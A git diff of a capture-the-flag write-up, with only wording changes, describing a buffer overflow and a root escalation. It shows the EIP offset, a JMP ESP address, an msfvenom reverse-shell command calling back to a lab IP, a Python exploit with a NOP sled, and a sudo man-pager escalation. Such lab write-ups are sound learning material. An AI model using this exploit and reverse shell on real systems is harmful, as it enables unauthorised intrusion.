@@ -37,13 +37,13 @@ do
                 exit
         fi
 done {% endhighlight %}
-I found the password when I was reading the get_reply function (the string that was being passed as a parameter to strcmp), but using it didn't do anything. I also noticed that the program uses the strcpy function, which is unsafe.
+I found the password when I was reading the get_reply function (the string that is being passed as a parameter to strcmp), but using it didn't do anything. I also noticed that the program uses the strcpy function, which is unsafe.
 ![Olly Code](ollyDBGCode.png)
-I used msf-pattern_create to generate a pattern with 1000 characters to test if the application would crash and then I used msf-pattern_offset to get the exact position.
+I used msf-pattern_create to generate a pattern with 1000 characters to test if the application crashes and then I used msf-pattern_offset to get the exact position.
 ![BOF Test 1](BOFTest1.png)
 ![BOF Test 2](BOFTest2.png) 
 ![BOF Test 3](BOFTest3.png)
-To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a "JMP esp" instruction at 0x311712F3, which means we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn't know how to do this with OllyDbg and I didn't have a Windows VM prepared).<br>
+To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a "JMP esp" instruction at 0x311712F3, which means that we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn't know how to do this with OllyDbg and I didn't have a Windows VM prepared).<br>
 I generated two shellcodes, one for Windows and the other one for Linux using msfvenom.
 {% highlight bash %}
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=1234 -f py -v shellcode -a x86 –platform Windows -b "\x00\x0a" #Windows shellcode
@@ -68,7 +68,7 @@ junk = 'A'*524
 retAddr = struct.pack("<I",0x311712F3)
 #Payload with 16 NOPs
 print junk+retAddr+"\x90"*16+shellcode{% endhighlight %}
-I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine).
+I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine, so I knew that it would work).
 ![Remote shell 1](remoteShell1.png)
 ![Remote shell 2](remoteShell2.png)
 <br>
@@ -76,7 +76,7 @@ I used the Linux shellcode because I knew that the target machine was using Linu
 Running sudo -l we can see that puck can run a script as root without suppling the password. This script has three functions (network, proclist and manual). The manual function runs the man command with the argument that we supply.
 ![Sudo -l](sudoPuck.png)
 ![Functions](functions.png)
-The man command uses a pager to show the manual and this pager allows us to run commands (and even to get a shell). I won't explain the method but [I'll leave a link to it](https://gtfobins.github.io/gtfobins/man/).
+The man command uses a pager to show the manual and this pager allows us to run commands. I won't explain the method but [I'll leave a link to it](https://gtfobins.github.io/gtfobins/man/).
 ![privesc](privesc.png)
 <h1>Conclusions</h1>
 This is a really fun and a bit difficult machine that helped me practising buffer overflow. I've learnt about the NOP sled technique and the importance of having a Windows VM to test programs in there (I'll work on this in the future).
